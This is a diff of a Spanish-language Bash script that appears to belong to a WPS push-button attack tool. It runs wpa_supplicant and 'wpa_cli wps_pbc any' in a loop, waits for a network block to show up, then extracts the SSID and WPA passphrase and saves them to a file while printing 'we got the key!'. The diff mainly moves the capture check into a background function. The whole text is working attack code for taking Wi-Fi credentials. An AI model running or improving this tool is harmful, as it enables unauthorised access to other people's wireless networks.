@@ -102,6 +102,28 @@ do
         fi
 done
 }
+function comprobar_wpa () {
+while :
+do
+sleep 15
+if ( grep -q "network=" ${pwd}pbc.conf ) ;
+              then
+                cat ${pwd}pbc.conf | grep $nombre_ap &>/dev/null
+                if [ $? -eq 0 ]; then
+                        escuchar_wps
+                fi
+                cp ${pwd}pbc.conf  ${red}_WPA.txt
+                echo -e "${VIOLETA}[**]${VERDE}	La tenemos!! hemos conseguido la llave!${BLANCO}"
+                wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
+                ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
+                echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
+                echo -e "${AMARILLO}[::]${BLANCO} Se ha creado un archivo con la WPA en el directorio de trabajo."
+                echo -e "${AMARILLO}[::]${BLANCO} Un placer y hasta la proxima!!!...ByTux0..."
+		break
+fi
+done
+exit
+}
 function escuchar_wps () {
 rm  ${pwd}pbc.conf &>/dev/null
 rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
@@ -111,36 +133,25 @@ ip link set "$iface_dos" up &>/dev/null
 echo "ctrl_interface=/var/run/wpa_supplicant 
 ctrl_interface_group=root
 update_config=1" >> ${pwd}pbc.conf
+comprobar_wpa &
 wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
 if [ $? != 0 ]; then
         sleep 3
         escuchar_wps
 fi
-wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli
+crono
+}
+function crono () {
 krono=100
     while [ $krono -gt 0 ]; 
       do
         krono=$((krono - 1))
-            if ( grep -q "network=" ${pwd}pbc.conf ) ;
-              then
-		cat ${pwd}pbc.conf | grep $nombre_ap &>/dev/null
-		if [ $? -eq 0 ]; then
-			escuchar_wps
-		fi
-                cp ${pwd}pbc.conf  ${red}_WPA.txt
-                echo -e "${VIOLETA}[**]${VERDE} La tenemos!! hemos conseguido la llave!${BLANCO}"
-		wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
-		ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
-		echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
-		echo -e "${AMARILLO}[::]${BLANCO} Se ha creado un archivo con la WPA en el directorio de trabajo."
-		echo -e "${AMARILLO}[::]${BLANCO} Un placer y hasta la proxima!!!...ByTux0..."
-		exit
-            fi
         sleep 1
     done
 sleep 2
 echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
-escuchar_wps
+wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli
+crono
 }
 function pbc_bucle () {
 echo -e "${VIOLETA}[WPS]${BLANCO}	Comenzamos a escuchar WPS"
